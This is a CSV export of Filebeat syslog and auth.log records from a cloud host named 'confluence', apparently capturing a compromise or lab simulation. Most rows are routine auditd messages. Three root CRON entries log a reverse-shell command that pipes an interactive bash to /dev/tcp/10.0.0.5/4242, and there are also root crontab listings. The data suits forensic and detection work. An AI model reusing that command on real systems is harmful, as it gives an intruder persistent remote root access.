"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","cloud.account.id","cloud.availability_zone","cloud.instance.id","cloud.instance.name","cloud.machine.type","cloud.project.id","cloud.provider","cloud.service.name","ecs.version","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.outcome","event.timezone","event.type","fileset.name","group.id","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"process.name","process.name.text","process.pid","related.hosts","related.ip","related.user","service.type","source.ip","source.port","system.auth.ssh.event","system.auth.ssh.method","system.auth.ssh.signature","system.auth.sudo.command","system.auth.sudo.pwd","system.auth.sudo.tty","system.auth.sudo.user","system.auth.useradd.home","system.auth.useradd.shell","user.effective.name","user.effective.name.text","user.id","user.name","user.name.text"
"Oct 26, 2022 @ 01:37:14.000",C2k4EIQBiYLzbw6NZF7X,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:22.134",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","23,002","Error receiving audit netlink packet (No buffer space available)",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:37:14.000",DGk4EIQBiYLzbw6NZF7X,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:22.134",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","23,111","Error receiving audit netlink packet (No buffer space available)",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:37:13.000",Cmk4EIQBiYLzbw6NZF7X,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:22.132",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,897","message repeated 2 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:37:03.000",2Wk4EIQBiYLzbw6NPV3C,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:12.129",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,821","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:37:01.000",wmk4EIQBiYLzbw6NKl06,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:07.128",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,696","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3195822,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:37:01.000",w2k4EIQBiYLzbw6NNV3j,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:37:10.113",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,655","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3195818,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:36:59.000",wWk4EIQBiYLzbw6NKl06,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:37:07.127",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,591","message repeated 9 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:36:09.000",yGk3EIQBiYLzbw6NZlzj,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:36:17.122",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,515","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:36:01.000",wmk3EIQBiYLzbw6NX1wE,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:36:15.106",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,549","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3157634,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:36:01.000",oWk3EIQBiYLzbw6NS1yL,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:36:10.122",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,390","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3157639,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:50.000",Tmk3EIQBiYLzbw6NMFwv,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:36:03.119",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,314","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:41.000",KWk2EIQBiYLzbw6N6UrS,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:35:45.104",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,372","-",sudo,sudo,"-",confluence,"-",root,system,"-","-","-","-","-",list,"/home/vagrant",unknown,root,"-","-",root,root,"-",root,root
"Oct 26, 2022 @ 01:35:41.000","S2k2EIQBiYLzbw6N_VBZ",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:35:50.104",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,475","Attempted login by UNKNOWN on UNKNOWN",nologin,nologin,"-",confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:40.000",6Gk2EIQBiYLzbw6N4kYN,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:43.116",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,186","(root) LIST (root)",crontab,crontab,3149988,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:40.000",Omk2EIQBiYLzbw6N9U6U,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:48.114",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,250","(root) LIST (root)",crontab,crontab,3150006,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:39.000",52k2EIQBiYLzbw6N4kYN,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:43.115",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","22,110","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:37.000",5mk2EIQBiYLzbw6N4kYN,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:43.115",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,972","message repeated 3 times: [ Error receiving audit netlink packet (No buffer space available)]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:35.000",2Gk2EIQBiYLzbw6N2kQ5,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:41.112",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,863","Error receiving audit netlink packet (No buffer space available)",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:32.000",uWk2EIQBiYLzbw6NxkGx,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:36.112",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,787","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:26.000",Amk2EIQBiYLzbw6NukH4,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:33.110",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,678","Error receiving audit netlink packet (No buffer space available)",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:25.000",U2k2EIQBiYLzbw6Nt0AO,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:32.109",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,573","message repeated 3 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:05.000",FGk2EIQBiYLzbw6NaDXo,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:12.103",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,497","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:35:01.000",Cmk2EIQBiYLzbw6NdDee,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:35:15.099",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,266","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3149102,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:35:01.000",8mk2EIQBiYLzbw6NUTB4,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:06.103",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,372","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3149103,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:34:57.000",8Wk2EIQBiYLzbw6NUTB4,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:35:06.102",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,267","message repeated 4 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:34:29.000","_Gk1EIQBiYLzbw6N3CBH",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:36.101",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,191","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
